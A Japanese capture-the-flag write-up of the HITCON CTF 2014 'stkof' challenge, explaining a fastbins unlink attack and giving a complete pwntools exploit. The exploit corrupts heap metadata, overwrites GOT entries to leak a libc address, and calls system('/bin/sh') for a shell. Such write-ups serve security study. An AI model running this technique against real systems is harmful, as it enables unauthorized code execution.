---
layout: post
redirect_from:
  - /writeup/ctf/2014/hitcon-ctf-2014-stkof/
  - /blog/2016/09/21/hitcon-ctf-2014-stkof/
date: "2016-09-21T03:29:10+09:00"
tags: [ "ctf", "writeup", "pwn", "hitcon", "heap", "fastbins" ]
"target_url": [ "https://github.com/ctfs/write-ups-2014/tree/master/hitcon-ctf-2014/stkof" ]
---

# HITCON CTF 2014: stkof


ちひろさんが[fastbinsで解いてた](http://pwn.hatenadiary.jp/entry/2016/09/20/002430)ので解いた。
fastbinsは始めて。
fastbins unlink attackに関してはkatagaitaiの資料が便利だった: <http://www.slideshare.net/bata_24/katagaitai-ctf-1-57598200>。

mallocされたpointerのlistがあるのでfastbinsを使わなくてもできるはず。こちらは先日のASISで既に使っている: <https://kimiyuki.net/blog/2016/09/12/asis-ctf-finals-2016-car-market/>。

## solution

無制限のheap buffer overflowがあるので適当にする問題。
64bitだし構造的にrevが楽なのでありがたい。

### fastbins unlink attack

1.  `malloc`するchunkの(内部の)大きさは統一しておく。これが異なると異なるfastbinsに登録されるため。
2.  いくらか`malloc`しひとつ`free`して、これをarena内のfastbinsのlistに登録させる。
3.  fastbinsに載せたchunkのmetadataを書き換える。
    -   その`fd`を別の位置に向ける。
    -   この時点では何も制約はない。
4.  `fd`の指す位置$+8$、その`size` fieldにあたる位置をchunkのsizeにする。
5.  `malloc`する。
    -   この時点でその結果である`p = malloc(size) == q+16`に対し`q->fd->size == size`のcheckが存在する。
    -   この`q->fd`がfastbinsに登録される。
6.  再度`malloc`すると、先の`q->fd`がその結果として返される。

この後いくらか`malloc`を呼んでも問題ないようだ。

## implementation

ubuntu 16.04環境で解いた。

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('host', nargs='?', default='localhost')
parser.add_argument('port', nargs='?', default=8000, type=int)
args = parser.parse_args()
context.log_level = 'debug'
p = remote(args.host, args.port)

def malloc(l):
    p.sendline(str(1))
    p.sendline(str(l))
    x = int(p.recvline())
    assert p.recvline().strip() == 'OK'
    return x
def fread(x, s):
    p.sendline(str(2))
    p.sendline(str(x))
    p.sendline(str(len(s)))
    p.send(s)
    assert p.recvline().strip() == 'OK'
def free(x):
    p.sendline(str(3))
    p.sendline(str(x))
    assert p.recvline().strip() == 'OK'
def strlen(x, ok=True):
    p.sendline(str(4))
    p.sendline(str(x))
    if ok:
        return p.recvuntil('OK\n', drop=True)

elf = ELF('./stkof')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
g_cnt = 0x602100
g_list = 0x602140

prev_size = 0x0
size = 0x8
fd = 0x10
bk = 0x18
PREV_INUSE = 1

# fastbins unlink attack
chunk_size = 0x20 # this is ok if 0x30, 0x40, etc
n = chunk_size
for i in range(n):  # set g_cnt = n = chunk_size
    malloc(chunk_size - size)
free(n)
payload = ''
payload += 'A' * (chunk_size - size - 0x8)
payload += 'A' * 0x8 # prev_size (used)
payload += p64(0x20) # size, setting PREV_INUSE is allowd
payload += p64(g_cnt - size) # fd
fread(n-1, payload)
malloc(chunk_size - size)
malloc(chunk_size - size) # this call returns (g_cnt + size)

# got overwrite
payload = ''
payload += 'A' * ((g_list+8) - (g_cnt+size))
payload += p64(elf.got['strlen'])
payload += p64(elf.got['__libc_start_main'])
fread(n+2, payload)
fread(1, p64(elf.plt['printf']))  # overwrite the got.strlen with plt.printf

# leak libc address
s = strlen(2)
assert s.endswith('...\n')
libc_start_main = u64(s[: -4].ljust(8, '\0'))
log.info('__libc_start_main: %#x', libc_start_main)
libc_base = libc_start_main - libc.symbols['__libc_start_main']
log.info('libc base: %#x', libc_base)

# system('/bin/sh')
fread(1, p64(libc_base + libc.symbols['system']))  # overflow the got.strlen with system
fread(2, '/bin/sh\0')
strlen(2, ok=False)

time.sleep(1)
p.sendline('id')
p.interactive()
```
